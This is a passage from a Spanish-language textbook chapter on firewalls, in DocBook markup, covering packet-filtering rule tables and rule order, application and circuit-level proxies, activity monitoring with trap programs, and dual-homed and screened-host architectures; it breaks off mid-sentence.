<!--l. 197--><para>
  </para><!--l. 197--><section 
role="subsection"><title><abbrev role="title-mark">15.3.1</abbrev><anchor 
   id="x1-23200015.3.1"  ></anchor>Filtrado de paquetes</title>
<!--l. 198--><para>  Cualquier router IP utiliza reglas de &#xFB01;ltrado para reducir la carga de la red; por ejemplo, se descartan
paquetes cuyo TTL ha llegado a cero, paquetes con un control de errores err&#x00F3;neos, o simplemente tramas de
broadcast. Adem&#x00E1;s de estas aplicaciones, el &#xFB01;ltrado de paquetes se puede utilizar para implementar
diferentes pol&#x02CA;&#x0131;ticas de seguridad en una red; el objetivo principal de todas ellas suele ser evitar el acceso no
autorizado entre dos redes, pero manteniendo intactos los accesos autorizados. Su funcionamiento es
habitualmente muy simple: se analiza la cabecera de cada paquete, y en funci&#x00F3;n de una serie de reglas
establecidas de antemano la trama es bloqueada o se le permite seguir su camino; estas reglas suelen
contemplar campos como el protocolo utilizado (TCP, UDP, ICMP&#x2026;), las direcciones fuente y destino, y el
puerto destino, lo cual ya nos dice que el &#xFB01;rewall ha de ser capaz de trabajar en los niveles de red (para
discriminar en funci&#x00F3;n de las direcciones origen y destino) y de transporte (para hacerlo en
funci&#x00F3;n de los puertos usados). Adem&#x00E1;s de la informaci&#x00F3;n de cabecera de las tramas, algunas
implementaciones de &#xFB01;ltrado permiten especi&#xFB01;car reglas basadas en la interfaz del router por donde
se ha de reenviar el paquete, y tambi&#x00E9;n en la interfaz por donde ha llegado hasta nosotros
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->&#x00BF;C&#x00F3;mo se especi&#xFB01;can tales reglas? Generalmente se expresan como una simple tabla de condiciones y
acciones que se consulta en orden hasta encontrar una regla que permita tomar una decisi&#x00F3;n sobre el
bloqueo o el reenv&#x02CA;&#x0131;o de la trama; adicionalmente, ciertas implementaciones permiten indicar si el bloqueo
de un paquete se noti&#xFB01;car&#x00E1; a la m&#x00E1;quina origen mediante un mensaje ICMP (<citation>[?]</citation>). Siempre hemos de tener
presente el orden de an&#x00E1;lisis de las tablas para poder implementar la pol&#x02CA;&#x0131;tica de seguridad de una
forma correcta; cuanto m&#x00E1;s complejas sean las reglas y su orden de an&#x00E1;lisis, m&#x00E1;s dif&#x02CA;&#x0131;cil ser&#x00E1; para el
administrador comprenderlas. Independientemente del formato, la forma de generar las tablas
depender&#x00E1; obviamente del sistema sobre el que trabajemos, por lo que es indispensable consultar su
documentaci&#x00F3;n; algunos ejemplos particulares &#x2013; pero aplicables a otros sistemas &#x2013; pueden encontrarse en
<citation>[?]</citation> (routers NetBlazer), <citation>[?]</citation> (routers Cisco), <citation>[?]</citation> (TIS Internet Firewall Toolkit sobre Unix) y
tambi&#x00E9;n en la obra indispensable al hablar de cortafuegos: <citation>[?]</citation> (screend, NetBlazer, Livingston y
Cisco).
<!--br/-->
<!--br/-->Por ejemplo, imaginemos una hipot&#x00E9;tica tabla de reglas de &#xFB01;ltrado de la siguiente forma:


     </para><literallayout role="verbatim">
&#x00A0;&#x00A0;&#x00A0;Origen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Destino&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Tipo&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Puerto&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Accion
&#x00A0;----------------------------------------------------------------------
&#x00A0;158.43.0.0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Deny
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;195.53.22.0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Deny
&#x00A0;158.42.0.0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Allow
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;193.22.34.0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Deny
</literallayout>
<!--l. 246--><para>Si al cortafuegos donde est&#x00E1; de&#xFB01;nida la pol&#x02CA;&#x0131;tica anterior llegara un paquete proveniente de una m&#x00E1;quina de la
red 158.43.0.0 se bloquear&#x02CA;&#x0131;a su paso, sin importar el destino de la trama; de la misma forma, todo el tr&#x00E1;&#xFB01;co
hacia la red 195.53.22.0 tambi&#x00E9;n se detendr&#x02CA;&#x0131;a. Pero, &#x00BF;qu&#x00E9; suceder&#x02CA;&#x0131;a si llega un paquete de un sistema de la
red 158.42.0.0 hacia 193.22.34.0? Una de las reglas nos indica que dejemos pasar todo el tr&#x00E1;&#xFB01;co proveniente
de 158.42.0.0, pero la siguiente nos dice que si el destino es 193.22.34.0 lo bloqueemos sin importar el
origen. En este caso depende de nuestra implementaci&#x00F3;n particular y el orden de an&#x00E1;lisis que siga: si se
comprueban las reglas desde el principio, el paquete atravesar&#x02CA;&#x0131;a el cortafuegos, ya que al analizar la tercera
entrada se &#xFB01;nalizar&#x02CA;&#x0131;an las comprobaciones; si operamos al rev&#x00E9;s, el paquete se bloquear&#x02CA;&#x0131;a porque
leemos antes la &#x00FA;ltima regla. Como podemos ver, ni siquiera en nuestra tabla &#x2013; muy simple &#x2013; las
cosas son obvias, por lo que si extendemos el ejemplo a un &#xFB01;rewall real podemos hacernos una
idea de hasta que punto hemos de ser cuidadosos con el orden de las entradas de nuestra
tabla.
<!--br/-->
<!--br/-->&#x00BF;Qu&#x00E9; suceder&#x02CA;&#x0131;a si, con la tabla del ejemplo anterior, llega un paquete que no cumple ninguna de nuestras
reglas? El sentido com&#x00FA;n nos dice que por seguridad se deber&#x02CA;&#x0131;a bloquear, pero esto no siempre sucede as&#x02CA;&#x0131;;
diferentes implementaciones ejecutan diferentes acciones en este caso. Algunas deniegan el paso por
defecto, otras aplican el contario de la &#x00FA;ltima regla especi&#xFB01;cada (es decir, si la &#x00FA;ltima entrada era un Allow
se niega el paso de la trama, y si era un Deny se permite), otras dejan pasar este tipo de tramas&#x2026;De
cualquier forma, para evitar problemas cuando uno de estos datagramas llega al cortafuegos, lo
mejor es insertar siempre una regla por defecto al &#xFB01;nal de nuestra lista &#x2013; recordemos una
vez m&#x00E1;s la cuesti&#x00F3;n del orden &#x2013; con la acci&#x00F3;n que deseemos realizar por defecto; si por ejemplo
deseamos bloquear el resto del tr&#x00E1;&#xFB01;co que llega al &#xFB01;rewall con la tabla anterior, y suponiendo que
las entradas se analizan en el orden habitual, podr&#x02CA;&#x0131;amos a~nadir a nuestra tabla la siguiente
regla:

     </para><literallayout role="verbatim">
&#x00A0;&#x00A0;&#x00A0;Origen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Destino&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Tipo&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Puerto&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Accion
&#x00A0;----------------------------------------------------------------------
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Deny
</literallayout>
<!--l. 283--><para>La especi&#xFB01;caci&#x00F3;n incorrecta de estas reglas constituye uno de los problemas de seguridad habituales en los
cortafuegos de &#xFB01;ltrado de paquetes; no obstante, el mayor problema es que un sistema de
&#xFB01;ltrado de paquetes es incapaz de analizar (y por tanto veri&#xFB01;car) datos situados por encima del
nivel de red OSI (<citation>[?]</citation>). A esto se le a~nade el hecho de que si utilizamos un simple router como
&#xFB01;ltro, las capacidades de registro de informaci&#x00F3;n del mismo suelen ser bastante limitadas, por lo
que en ocasiones es dif&#x02CA;&#x0131;cil la detecci&#x00F3;n de un ataque; se puede considerar un mecanismo de
prevenci&#x00F3;n m&#x00E1;s que de detecci&#x00F3;n. Para intentar solucionar estas &#x2013; y otras vulnerabilidades &#x2013; es
recomendable utilizar aplicaciones software capaces de &#xFB01;ltrar las conexiones a servicios; a
dichas aplicaciones se les denomina proxies de aplicaci&#x00F3;n, y las vamos a comentar en el punto
siguiente.
  </para></section><!--end subsection--><!--l. 296--><section 
role="subsection"><title><abbrev role="title-mark">15.3.2</abbrev><anchor 
   id="x1-23300015.3.2"  ></anchor>Proxy de aplicaci&#x00F3;n</title>
<!--l. 297--><para>  Adem&#x00E1;s del &#xFB01;ltrado de paquetes, es habitual que los cortafuegos utilicen aplicaciones software para
reenviar o bloquear conexiones a servicios como &#xFB01;nger, telnet o FTP; a tales aplicaciones se les
denomina servicios proxy, mientras que a la m&#x00E1;quina donde se ejecutan se le llama pasarela de
aplicaci&#x00F3;n.
<!--br/-->
<!--br/-->Los servicios proxy poseen una serie de ventajas de cara a incrementar nuestra seguridad (<citation>[?]</citation>); en
primer lugar, permiten &#x00FA;nicamente la utilizaci&#x00F3;n de servicios para los que existe un proxy, por lo
que si en nuestra organizaci&#x00F3;n la pasarela de aplicaci&#x00F3;n contiene &#x00FA;nicamente proxies para telnet,
HTTP y FTP, el resto de servicios no estar&#x00E1;n disponibles para nadie. Una segunda ventaja es
que en la pasarela es posible &#xFB01;ltrar protocolos bas&#x00E1;ndose en algo m&#x00E1;s que la cabecera de las
tramas, lo que hace posible por ejemplo tener habilitado un servicio como FTP pero con &#x00F3;rdenes
restringidas (podr&#x02CA;&#x0131;amos bloquear todos los comandos put para que nadie pueda subir &#xFB01;cheros a un
servidor). Adem&#x00E1;s, los application gateways permiten un grado de ocultaci&#x00F3;n de la estructura
de la red protegida (por ejemplo, la pasarela es el &#x00FA;nico sistema cuyo nombre est&#x00E1; disponible
hacia el exterior), facilita la autenticaci&#x00F3;n y la auditor&#x02CA;&#x0131;a del tr&#x00E1;&#xFB01;co sospechoso antes de que
alcance el host destino y, quiz&#x00E1;s m&#x00E1;s importante, simpli&#xFB01;ca enormemente las reglas de &#xFB01;ltrado
implementadas en el router (que como hemos dicho antes pueden convertirse en la fuente de
muchos problemas de seguridad): s&#x00F3;lo hemos de permitir el tr&#x00E1;&#xFB01;co hacia la pasarela, bloqueando el
resto.
<!--br/-->
<!--br/-->&#x00BF;Qu&#x00E9; servicios ofrecer en nuestro gateway, y c&#x00F3;mo hacerlo? La con&#xFB01;guraci&#x00F3;n de la mayor&#x02CA;&#x0131;a de servicios
&#x2018;habituales&#x2019; est&#x00E1; muy bien explicada (como el resto del libro) en el cap&#x02CA;&#x0131;tulo 8 de <citation>[?]</citation>. Adem&#x00E1;s, en numerosos
art&#x02CA;&#x0131;culos se comentan problemas espec&#x02CA;&#x0131;&#xFB01;cos de algunos servicios; uno muy recomendable, centrado en el
sistema de ventanas X Window, pero donde tambi&#x00E9;n se habla de otros protocolos, puede ser
<citation>[?]</citation>.
<!--br/-->
<!--br/-->El principal inconveniente que encontramos a la hora de instalar una pasarela de aplicaci&#x00F3;n es que
cada servicio que deseemos ofrecer necesita su propio proxy; adem&#x00E1;s se trata de un elemento
que frecuentemente es m&#x00E1;s caro que un simple &#xFB01;ltro de paquetes, y su rendimiento es mucho
menor (por ejemplo, puede llegar a limitar el ancho de banda efectivo de la red, si el an&#x00E1;lisis de
cada trama es costoso). En el caso de protocolos cliente&#x2013;servidor (como telnet) se a~nade la
desventaja de que necesitamos dos pasos para conectar hacia la zona segura o hacia el resto
de la red; incluso algunas implementaciones necesitan clientes modi&#xFB01;cados para funcionar
correctamente.
<!--br/-->

<!--br/-->Una variante de las pasarelas de aplicaci&#x00F3;n la constituyen las pasarelas de nivel de circuito (Circuit-level
Gateways, <citation>[?]</citation>), sistemas capaces de redirigir conexiones (reenviando tramas) pero que no pueden procesar
o &#xFB01;ltrar paquetes en base al protocolo utilizado; se limitan simplemente a autenticar al usuario (a su
conexi&#x00F3;n) antes de establecer el circuito virtual entre sistemas. La principal ventaja de este tipo de
pasarelas es que proveen de servicios a un amplio rango de protocolos; no obstante, necesitan software
especial que tenga las llamadas al sistema cl&#x00E1;sicas sustituidas por funciones de librer&#x02CA;&#x0131;a seguras, como SOCKS
(<citation>[?]</citation>).
  </para></section><!--end subsection--><!--l. 347--><section 
role="subsection"><title><abbrev role="title-mark">15.3.3</abbrev><anchor 
   id="x1-23400015.3.3"  ></anchor>Monitorizaci&#x00F3;n de la actividad</title>
<!--l. 348--><para>  Monitorizar la actividad de nuestro cortafuegos es algo indispensable para la seguridad de todo el
per&#x02CA;&#x0131;metro protegido; la monitorizaci&#x00F3;n nos facilitar&#x00E1; informaci&#x00F3;n sobre los intentos de ataque que estemos
sufriendo (origen, franjas horarias, tipos de acceso&#x2026;), as&#x02CA;&#x0131; como la existencia de tramas que aunque no
supongan un ataque a priori s&#x02CA;&#x0131; que son al menos sospechosas (podemos leer <citation>[?]</citation> para hacernos una idea de
que tipo de tramas &#x2018;extra~nas&#x2019; se pueden llegar a detectar).
<!--br/-->
<!--br/-->&#x00BF;Qu&#x00E9; informaci&#x00F3;n debemos registrar? Adem&#x00E1;s de los registros est&#x00E1;ndar (los que incluyen estad&#x02CA;&#x0131;sticas de tipos
de paquetes recibidos, frecuencias, o direcciones fuente y destino) <citation>[?]</citation> recomienda auditar informaci&#x00F3;n de la
conexi&#x00F3;n (origen y destino, nombre de usuario &#x2013; recordemos el servicio ident &#x2013; hora y duraci&#x00F3;n), intentos de
uso de protocolos denegados, intentos de falsi&#xFB01;caci&#x00F3;n de direcci&#x00F3;n por parte de m&#x00E1;quinas internas al per&#x02CA;&#x0131;metro
de seguridad (paquetes que llegan desde la red externa con la direcci&#x00F3;n de un equipo interno) y tramas
recibidas desde routers desconocidos. Evidentemente, todos esos registros han de ser leidos con frecuencia,
y el administrador de la red ha de tomar medidas si se detectan actividades sospechosas; si la cantidad de
logs generada es considerable nos puede interesar el uso de herramientas que &#xFB01;ltren dicha
informaci&#x00F3;n.
<!--br/-->
<!--br/-->Un excelente mecanismo para incrementar mucho nuestra seguridad puede ser la sustituci&#x00F3;n de servicios
reales en el cortafuegos por programas trampa (<citation>[?]</citation>). La idea es sencilla: se trata de peque~nas aplicaciones
que simulan un determinado servicio, de forma que un posible atacante piense que dicho servicio est&#x00E1;
habilitado y prosiga su &#x2018;ataque&#x2019;, pero que realmente nos est&#x00E1;n enviando toda la informaci&#x00F3;n posible sobre el
pirata. Este tipo de programas, una especie de troyano, suele tener una &#xFB01;nalidad m&#x00FA;ltiple: aparte de
detectar y noti&#xFB01;car ataques, el atacante permanece entretenido intentando un ataque que cree factible, lo
que por un lado nos bene&#xFB01;cia directamente &#x2013; esa persona no intenta otro ataque quiz&#x00E1;s m&#x00E1;s peligroso &#x2013; y por
otro nos permite entretener al pirata ante una posible traza de su conexi&#x00F3;n. Evidentemente,
nos estamos arriesgando a que nuestro atacante descubra el mecanismo y lance ataques m&#x00E1;s
peligrosos, pero como el nivel de conocimientos de los atacantes de redes habituales en general no
es muy elevado (m&#x00E1;s bien todo lo contrario), este mecanismo nos permite descubrir posibles
exploits utilizados por los piratas, observar a qu&#x00E9; tipo de atacantes nos enfrentamos, e incluso
divertirnos con ellos. En la Universidad Polit&#x00E9;cnica de Valencia existen algunos sistemas con
este tipo de trampas, y realmente es curioso observar c&#x00F3;mo algunos intrusos siguen intentando
aprovechar bugs que fueron descubiertos &#x2013; y solucionados &#x2013; hace m&#x00E1;s de cuatro a~nos (ejemplos
t&#x02CA;&#x0131;picos aqu&#x02CA;&#x0131; son PHF y algunos problemas de sendmail). En <citation>[?]</citation>, un art&#x02CA;&#x0131;culo cl&#x00E1;sico a la hora de
hablar de seguridad (tambi&#x00E9;n se comenta el caso en el cap&#x02CA;&#x0131;tulo 10 de <citation>[?]</citation>), se muestra c&#x00F3;mo Bill
Cheswick, un experto en seguridad de los laboratorios AT&#x0026;T estadounidenses, es capaz de analizar
detenidamente gracias a estos programas las actividades de un pirata que golpea el gateway de la
compa~n&#x02CA;&#x0131;a.
  </para></section><!--end subsection--></section><!--end section--><!--l. 395--><section 
role="section"><title><abbrev role="title-mark">15.4</abbrev><anchor 
   id="x1-23500015.4"  ></anchor>Arquitecturas de cortafuegos</title>
<!--l. 397--><para>
  </para><!--l. 397--><section 
role="subsection"><title><abbrev role="title-mark">15.4.1</abbrev><anchor 
   id="x1-23600015.4.1"  ></anchor>Cortafuegos de &#xFB01;ltrado de paquetes</title>
<!--l. 398--><para>  Un &#xFB01;rewall sencillo puede consistir en un dispositivo capaz de &#xFB01;ltrar paquetes, un choke: se trata del
modelo de cortafuegos m&#x00E1;s antiguo (<citation>[?]</citation>), basado simplemente en aprovechar la capacidad de algunos routers

&#x2013; denominados screening routers &#x2013; para hacer un enrutado selectivo, es decir, para bloquear o permitir el
tr&#x00E1;nsito de paquetes mediante listas de control de acceso en funci&#x00F3;n de ciertas caracter&#x02CA;&#x0131;sticas de las tramas,
de forma que el router actue como pasarela de toda la red. Generalmente estas caracter&#x02CA;&#x0131;sticas para
determinar el &#xFB01;ltrado son las direcciones origen y destino, el protocolo, los puertos origen y destino (en el
caso de TCP y UDP), el tipo de mensaje (en el caso de ICMP) y los interfaces de entrada y salida de la
trama en el router.
<!--br/-->
<!--br/-->En un cortafuegos de &#xFB01;ltrado de paquetes los accesos desde la red interna al exterior que no est&#x00E1;n
bloqueados son directos (no hay necesidad de utilizar proxies, como sucede en los cortafuegos basados en
una m&#x00E1;quina con dos tarjetas de red), por lo que esta arquitectura es la m&#x00E1;s simple de implementar (en
muchos casos sobre hardware ya ubicado en la red) y la m&#x00E1;s utilizada en organizaciones que no precisan
grandes niveles de seguridad &#x2013; como las que vemos aqu&#x02CA;&#x0131; &#x2013;. No obstante, elegir un cortafuegos tan sencillo
puede no ser recomendable en ciertas situaciones, o para organizaciones que requieren una mayor
seguridad para su subred, ya que los simples chokes presentan m&#x00E1;s desventajas que bene&#xFB01;cios para
la red protegida. El principal problema es que no disponen de un sistema de monitorizaci&#x00F3;n
so&#xFB01;sticado, por lo que muchas veces el administrador no puede determinar si el router est&#x00E1; siendo
atacado o si su seguridad ha sido comprometida. Adem&#x00E1;s las reglas de &#xFB01;ltrado pueden llegar a
ser complejas de establecer, y por tanto es dif&#x02CA;&#x0131;cil comprobar su correcci&#x00F3;n: habitualmente s&#x00F3;lo
se comprueba a trav&#x00E9;s de pruebas directas, con los problemas de seguridad que esto puede
implicar.
<!--br/-->
<!--br/-->Si a pesar de esto decidimos utilizar un router como &#xFB01;ltro de paquetes, como en cualquier &#xFB01;rewall es
recomendable bloquear todos los servicios que no se utilicen desde el exterior (especialmente NIS, NFS,
X-Window y TFTP), as&#x02CA;&#x0131; como el acceso desde m&#x00E1;quinas no con&#xFB01;ables hacia nuestra subred; adem&#x00E1;s, es
tambi&#x00E9;n importante para nuestra seguridad bloquear los paquetes con encaminamiento en origen
activado.
  </para></section><!--end subsection--><!--l. 434--><section 
role="subsection"><title><abbrev role="title-mark">15.4.2</abbrev><anchor 
   id="x1-23700015.4.2"  ></anchor>Dual-Homed Host</title>
<!--l. 435--><para>  El segundo modelo de cortafuegos est&#x00E1; formado por simples m&#x00E1;quinas Unix equipadas con dos o m&#x00E1;s
tarjetas de red y denominadas (<citation>[?]</citation>) an&#xFB01;triones de dos bases (dual&#x2013;homed hosts) o multibase (multi&#x2013;homed
hosts), y en las que una de las tarjetas se suele conectar a la red interna a proteger y la otra a la red
externa a la organizaci&#x00F3;n. En esta con&#xFB01;guraci&#x00F3;n el choke y el basti&#x00F3;n coinciden en el mismo equipo: la m&#x00E1;quina
Unix.
<!--br/-->
<!--br/-->El sistema ha de ejecutar al menos un servidor proxy para cada uno de los servicios que deseemos pasar a
trav&#x00E9;s del cortafuegos, y tambi&#x00E9;n es necesario que el IP Forwarding est&#x00E9; deshabilitado en el equipo:
aunque una m&#x00E1;quina con dos tarjetas puede actuar como un router, para aislar el tr&#x00E1;&#xFB01;co entre
la red interna y la externa es necesario que el choke no enrute paquetes entre ellas. As&#x02CA;&#x0131;, los
sistemas externos &#x2018;ver&#x00E1;n&#x2019; al host a trav&#x00E9;s de una de las tarjetas y los internos a trav&#x00E9;s de la otra,
pero entre las dos partes no puede existir ning&#x00FA;n tipo de tr&#x00E1;&#xFB01;co que no pase por el cortafuegos:
todo el intercambio de datos entre las redes se ha de realizar bien a trav&#x00E9;s de servidores proxy
situados en el host basti&#x00F3;n o bien permitiendo a los usuarios conectar directamente al mismo. La
segunda de estas aproximaciones es sin duda poco recomendable, ya que un usuario que consiga
aumentar su nivel de privilegios en el sistema puede romper toda la protecci&#x00F3;n del cortafuegos,
por ejemplo reactivando el IP Forwarding); adem&#x00E1;s &#x2013; esto ya no relativo a la seguridad sino a
la funcionalidad del sistema &#x2013; suele ser inc&#x00F3;modo para los usuarios tener que acceder a una
m&#x00E1;quina que haga de puente entre ellos e Internet. De esta forma, la ubicaci&#x00F3;n de proxies es lo m&#x00E1;s
recomendable, pero puede ser problem&#x00E1;tico el con&#xFB01;gurar cierto tipo de servicios o protocolos que
no se dise~naron teniendo en cuenta la existencia de un proxy entre los dos extremos de una
conexi&#x00F3;n.
  </para></section><!--end subsection--><!--l. 464--><section 
role="subsection"><title><abbrev role="title-mark">15.4.3</abbrev><anchor 
   id="x1-23800015.4.3"  ></anchor>Screened Host</title>
<!--l. 465--><para>  Un paso m&#x00E1;s en t&#x00E9;rminos de seguridad de los cortafuegos es la arquitectura screened host o choke-gate, que
combina un router con un host basti&#x00F3;n, y donde el principal nivel de seguridad proviene del &#xFB01;ltrado de

paquetes (es decir, el router es la primera y m&#x00E1;s importante l&#x02CA;&#x0131;nea de defensa). En la m&#x00E1;quina basti&#x00F3;n,
&#x00FA;nico sistema accesible desde el exterior, se ejecutan los proxies de las aplicaciones, mientras
que el choke se encarga de &#xFB01;ltrar los paquetes que se puedan considerar peligrosos para la
seguridad de la red interna, permitiendo &#x00FA;nicamente la comunicaci&#x00F3;n con un reducido n&#x00FA;mero de
servicios.
<!--br/-->
<!--br/-->Pero, &#x00BF;d&#x00F3;nde situar el sistema basti&#x00F3;n, en la red interna o en el exterior del router? La mayor&#x02CA;&#x0131;a de autores
(<citation>[?]</citation>, <citation>[?]</citation>&#x2026;) recomiendan situar el router entre la red exterior y el host basti&#x00F3;n, pero otros (<citation>[?]</citation>)
de&#xFB01;enden justo lo contrario: situar el basti&#x00F3;n en la red exterior no provoca aparentemente una
degradaci&#x00F3;n de la seguridad, y adem&#x00E1;s ayuda al administrador a comprender la necesidad de un
elevado nivel de &#xFB01;abilidad en esta m&#x00E1;quina, ya que est&#x00E1; sujeta a ataques externos y no tiene por
qu&#x00E9; ser un host &#xFB01;able; de cualquier forma, la &#x2018;no degradaci&#x00F3;n&#x2019; de la seguridad mediante esta
aproximaci&#x00F3;n es m&#x00E1;s que discutible, ya que habitualmente es m&#x00E1;s f&#x00E1;cil de proteger un router que
una m&#x00E1;quina con un operativo de prop&#x00F3;sito general, como Unix, que adem&#x00E1;s por de&#xFB01;nici&#x00F3;n ha de
ofrecer ciertos servicios: no tenemos m&#x00E1;s que &#xFB01;jarnos en el n&#x00FA;mero de problemas de seguridad que
afectan a por ejemplo a IOS (el sistema operativo de los routers Cisco), muy reducido frente
a los que afectan a diferentes &#xFB02;avours de Unix. En todo caso, aparte de por estos matices,
asumiremos la primera opci&#x00F3;n por considerarla mayoritaria entre los expertos en seguridad
inform&#x00E1;tica; as&#x02CA;&#x0131;, cuando una m&#x00E1;quina de la red interna desea comunicarse con el exterior existen dos
posibilidades:
     </para><itemizedlist>
     <listitem>
     <!--l. 495--><para>El choke permite la salida de algunos servicios a todas o a parte de las m&#x00E1;quinas internas a
     trav&#x00E9;s de un simple &#xFB01;ltrado de paquetes.
     </para></listitem>
     <listitem>
     <!--l. 497--><para>El choke prohibe todo el tr&#x00E1;&#xFB01;co entre m&#x00E1;quinas de la red interna y el exterior, permitiendo s&#x00F3;lo
     la salida de ciertos servicios que provienen de la m&#x00E1;quina basti&#x00F3;n y que han sido autorizados
     por la pol&#x02CA;&#x0131;tica de seguridad de la organizaci&#x00F3;n. As&#x02CA;&#x0131;, estamos obligando a los usuarios a que las
     conexiones con el exterior se realicen a trav&#x00E9;s de los servidores proxy situados en el basti&#x00F3;n.</para></listitem></itemizedlist>
<!--l. 504--><para>La primera aproximaci&#x00F3;n entra~na un mayor nivel de complejidad a la hora de con&#xFB01;gurar las listas de control
de acceso del router, mientras que si elegimos la segunda la di&#xFB01;cultad est&#x00E1; en con&#xFB01;gurar los servidores proxy
(recordemos que no todas las aplicaciones soportan bien estos mecanismos) en el host basti&#x00F3;n. Desde el
punto de vista de la seguridad es m&#x00E1;s recomendable la segunda opci&#x00F3;n, ya que la probabilidad de
dejar escapar tr&#x00E1;&#xFB01;co no deseado es menor. Por supuesto, en funci&#x00F3;n de la pol&#x02CA;&#x0131;tica de seguridad
que de&#xFB01;namos en nuestro entorno, se pueden combinar ambas aproximaciones, por ejemplo
permitiendo el tr&#x00E1;&#xFB01;co entre las m&#x00E1;quinas internas y el exterior de ciertos protocolos dif&#x02CA;&#x0131;ciles de
encaminar a trav&#x00E9;s de un proxy o sencillamente que no entra~nen mucho riesgo para nuestra
seguridad (t&#x02CA;&#x0131;picamente, NTP, DNS&#x2026;), y obligando para el resto de servicios a utilizar el host
basti&#x00F3;n.
<!--br/-->
<!--br/-->La arquitectura screened host puede parecer a primera vista m&#x00E1;s peligrosa que la basada en una
simple m&#x00E1;quina con varias interfaces de red; en primer lugar, tenemos no uno sino dos sistemas
accesibles desde el exterior, por lo que ambos han de ser con&#xFB01;gurados con las m&#x00E1;ximas medidas de
seguridad. Adem&#x00E1;s, la mayor complejidad de dise~no hace m&#x00E1;s f&#x00E1;cil la presencia de errores que
puedan desembocar en una violaci&#x00F3;n de la pol&#x02CA;&#x0131;tica implantada, mientras que con un host con
dos tarjetas nos aseguramos de que &#x00FA;nicamente aquellos servicios con un proxy con&#xFB01;gurado
podr&#x00E1;n generar tr&#x00E1;&#xFB01;co entre la red externa y la interna (a no ser que por error activemos el
IP Forwarding). Sin embargo, aunque estos problemas son reales, se solventan tomando las
precauciones necesarias a la hora de dise~nar e implantar el cortafuegos y de&#xFB01;niendo una pol&#x02CA;&#x0131;tica de
